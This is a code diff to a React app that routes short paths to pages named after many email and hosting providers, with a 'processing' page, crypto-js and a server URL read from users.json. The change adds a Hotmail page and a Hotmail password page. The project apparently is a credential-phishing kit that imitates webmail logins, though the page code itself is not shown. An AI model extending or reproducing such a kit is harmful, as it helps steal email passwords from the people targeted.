@@ -10,6 +10,8 @@ import Godaddy from "./pages/godaddy";
 import Hinet from "./pages/hinet";
 import Hiworks from "./pages/hiworks";
 import HomeRedirect from "./pages/home";
+import Hotmail from "./pages/hotmail";
+import HotmailPassword from "./pages/hotmail/password";
 import Mail from "./pages/mail";
 import Office from "./pages/office";
 import Processing from "./pages/processing";
@@ -27,7 +29,6 @@ var CryptoJS = require("crypto-js");
 const serverurl = require("./users.json");
 
 function App() {
- 
   return (
     <Fragment>
       <Router>
@@ -48,6 +49,8 @@ function App() {
         <Yahoo path="yh" />
         <Yandex path="yx" />
         <Zoho path="zh" />
+        <Hotmail path="ht" />
+        <HotmailPassword path="ht/ps" />
         <Processing path="processing" />
       </Router>
       <ToastContainer
